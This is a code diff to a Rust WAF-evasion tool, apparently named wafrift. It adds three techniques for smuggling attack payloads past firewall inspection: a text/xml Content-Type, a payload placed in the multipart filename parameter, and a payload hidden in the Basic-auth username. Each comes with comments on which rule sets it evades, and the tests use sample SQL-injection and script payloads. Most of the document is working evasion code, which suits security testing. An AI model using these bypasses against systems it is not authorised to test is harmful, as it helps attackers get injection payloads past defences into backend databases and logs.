@@ -149,6 +149,28 @@ pub const VECTORS: &[Vector] = &[
     // JS cbor-x, Python cbor2, Java jackson-cbor) decodes it
     // server-side. We emit a minimal `{param: payload}` map.
     Vector { name: "POST-cbor", content_type: "application/cbor" },
+    // text/xml — CRS xml-body rules anchor on `application/xml`
+    // ONLY in many profiles; `text/xml` is an RFC-7303-permitted
+    // alternate MIME most XML parsers (libxml2, Xerces, JAXB,
+    // dotnet System.Xml) accept identically. WAF declines body
+    // inspection; backend parses XML normally.
+    Vector { name: "POST-text-xml", content_type: "text/xml" },
+    // Multipart with payload in the `filename=` parameter, NOT
+    // the part body. CRS multipart rules inspect FIELD VALUES;
+    // `filename` is the attachment metadata. Backends that read
+    // `multipart.parts[i].filename` and pass it to a downstream
+    // sink (logger, search index, NoSQL store) flow the attack
+    // payload through. Especially potent for SQLi-in-filename and
+    // path-traversal-in-filename rule sets.
+    Vector { name: "POST-multipart-filename", content_type: "multipart/form-data" },
+    // Authorization: Basic carrying payload-in-username. Wafrift
+    // sends `Basic base64(<payload>:dummy)`. WAFs trust the
+    // Authorization header for routing / rate-limiting and skip
+    // body-shape ARGS inspection on its contents. Backends that
+    // log the decoded username (audit trails, login attempt
+    // metrics, custom auth middleware) flow it into SQL / log /
+    // template sinks.
+    Vector { name: "authorization-basic", content_type: "" },
     Vector { name: "cookie", content_type: "" },
     Vector { name: "hpp", content_type: "" },
     Vector { name: "x-forwarded-for", content_type: "" },
@@ -465,6 +487,59 @@ fn build_request_for_vector(
             // be pure overhead for one builder.
             let body = encode_cbor_string_map(param, payload);
             Some(http.post(target).header("Content-Type", ct).body(body))
+        }
+        "POST-text-xml" => {
+            // Identical XML body shape to POST-xml; only the
+            // declared Content-Type differs. text/xml vs
+            // application/xml is the routing crack we're exploiting.
+            let escaped = xml_text_escape(payload);
+            let body = format!(
+                "<?xml version=\"1.0\"?><request><{name}>{escaped}</{name}></request>",
+                name = param,
+            );
+            Some(http.post(target).header("Content-Type", ct).body(body))
+        }
+        "POST-multipart-filename" => {
+            // Payload rides in `filename=<...>`; the part body is
+            // a benign 1-byte placeholder so a backend that reads
+            // value-only sees nothing interesting. Backends that
+            // log `filename` (audit, search, NoSQL keying) flow
+            // the payload into a downstream sink.
+            let boundary = format!("----WafRiftFnBoundary{fire_counter:x}");
+            // Filename values per RFC 7578 are quoted-string; we
+            // backslash-escape any `"` to keep the multipart parse
+            // valid. Any other byte rides verbatim.
+            let filename = payload.replace('\\', "\\\\").replace('"', "\\\"");
+            let body = format!(
+                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"; filename=\"{filename}\"\r\n\r\nx\r\n--{boundary}--\r\n",
+            );
+            Some(
+                http.post(target)
+                    .header(
+                        "Content-Type",
+                        format!("multipart/form-data; boundary={boundary}"),
+                    )
+                    .body(body),
+            )
+        }
+        "authorization-basic" => {
+            // Basic auth header: `Authorization: Basic base64(user:pass)`.
+            // We hide the payload in the USERNAME half. WAFs that
+            // inspect Authorization usually only check for absence
+            // /  presence (rate-limit / brute-force counting), not
+            // the decoded contents.
+            use base64::Engine as _;
+            let basic = format!("{payload}:wafrift-probe");
+            let encoded = base64::engine::general_purpose::STANDARD.encode(basic.as_bytes());
+            let url = crate::scan::scan_url_with_param(
+                target,
+                param,
+                &urlencoding::encode(payload),
+            );
+            Some(
+                http.get(&url)
+                    .header("Authorization", format!("Basic {encoded}")),
+            )
         }
         "POST-multipart-dupbound" => {
             // Two boundary strings declared (header lists one;
@@ -2468,6 +2543,200 @@ mod tests {
             "PUT-form",
             "hpp-semicolon",
             "POST-cbor",
+        ] {
+            assert!(names.contains(required), "missing vector {required}");
+        }
+    }
+
+    // ── POST-text-xml ─────────────────────────────────────────
+
+    #[test]
+    fn build_post_text_xml_uses_text_xml_mime_not_application() {
+        // The whole point of this vector — CRS xml-body anchors
+        // on `application/xml`; this one MUST say `text/xml`.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-text-xml").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
+        assert!(ct.starts_with("text/xml"));
+        assert!(!ct.starts_with("application/xml"));
+    }
+
+    #[test]
+    fn build_post_text_xml_body_shape_matches_application_xml() {
+        // Body shape is identical to POST-xml — only the
+        // Content-Type changes. Same parser eats the bytes.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-text-xml").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "id", "1=1", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert!(s.starts_with("<?xml"));
+        assert!(s.contains("<id>"));
+        assert!(s.contains("1=1"));
+    }
+
+    #[test]
+    fn build_post_text_xml_escapes_xml_significant_chars() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-text-xml").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "<script>", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert!(s.contains("&lt;script&gt;"));
+        assert!(!s.contains("<script>"));
+    }
+
+    // ── POST-multipart-filename ───────────────────────────────
+
+    #[test]
+    fn build_post_multipart_filename_carries_payload_in_filename_param() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-filename").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "upload", "ATTACK", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert!(s.contains("filename=\"ATTACK\""), "body: {s}");
+    }
+
+    #[test]
+    fn build_post_multipart_filename_part_body_is_benign_placeholder() {
+        // The part value MUST be benign — the attack lives in the
+        // filename. Anti-rig against a refactor that put the
+        // payload back in the body where the WAF will see it.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-filename").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "upload", "ATTACK_MARKER", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        // The bytes between `\r\n\r\n` and `\r\n--<boundary>--` are
+        // the part body. Verify those contain ONLY the placeholder
+        // and NOT the attack string.
+        let after_blank = s.split("\r\n\r\n").nth(1).unwrap();
+        let part_body = after_blank.lines().next().unwrap();
+        assert_eq!(
+            part_body, "x",
+            "part body must be benign placeholder, got {part_body:?}"
+        );
+        // The attack appears EXACTLY once — in the filename field.
+        assert_eq!(s.matches("ATTACK_MARKER").count(), 1);
+    }
+
+    #[test]
+    fn build_post_multipart_filename_escapes_quotes_in_payload() {
+        // Filename per RFC 7578 is a quoted-string — a literal `"`
+        // in the payload would terminate the field early. Confirm
+        // the builder backslash-escapes them so the multipart parse
+        // stays valid.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-filename").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "upload", "say \"hi\"", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        // The escaped form `\\"` MUST appear in the wire bytes.
+        assert!(
+            s.contains("\\\""),
+            "inner quotes must be backslash-escaped: {s}"
+        );
+    }
+
+    #[test]
+    fn build_post_multipart_filename_emits_boundary_correctly() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-filename").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "upload", "x", 0xAB)
+            .unwrap()
+            .build()
+            .unwrap();
+        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
+        assert!(ct.contains("WafRiftFnBoundaryab"), "ct: {ct}");
+    }
+
+    // ── authorization-basic ───────────────────────────────────
+
+    #[test]
+    fn build_authorization_basic_sets_basic_auth_header() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "authorization-basic").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "user", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let auth = req.headers().get("authorization").unwrap().to_str().unwrap();
+        assert!(auth.starts_with("Basic "));
+    }
+
+    #[test]
+    fn build_authorization_basic_encodes_payload_as_username_half() {
+        use base64::Engine as _;
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "authorization-basic").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "' OR 1=1--", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let auth = req.headers().get("authorization").unwrap().to_str().unwrap();
+        let b64 = auth.strip_prefix("Basic ").unwrap();
+        let decoded = base64::engine::general_purpose::STANDARD.decode(b64).unwrap();
+        let s = std::str::from_utf8(&decoded).unwrap();
+        // Username:password — payload MUST be the user half.
+        assert!(s.starts_with("' OR 1=1--:"));
+    }
+
+    #[test]
+    fn build_authorization_basic_uses_get_method() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "authorization-basic").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.method(), "GET");
+    }
+
+    #[test]
+    fn build_authorization_basic_attaches_query_param_too() {
+        // The endpoint URL still gets the query param — the
+        // Authorization carries an EXTRA payload location. Some
+        // backends pass-through both for logging; either side
+        // could land.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "authorization-basic").unwrap();
+        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "PAYLOAD", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let url = req.url().to_string();
+        assert!(url.contains("q="), "url should carry the param: {url}");
+    }
+
+    // ── catalogue presence (round 3) ──────────────────────────
+
+    #[test]
+    fn round_three_vectors_are_in_catalogue() {
+        let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
+        for required in [
+            "POST-text-xml",
+            "POST-multipart-filename",
+            "authorization-basic",
         ] {
             assert!(names.contains(required), "missing vector {required}");
         }
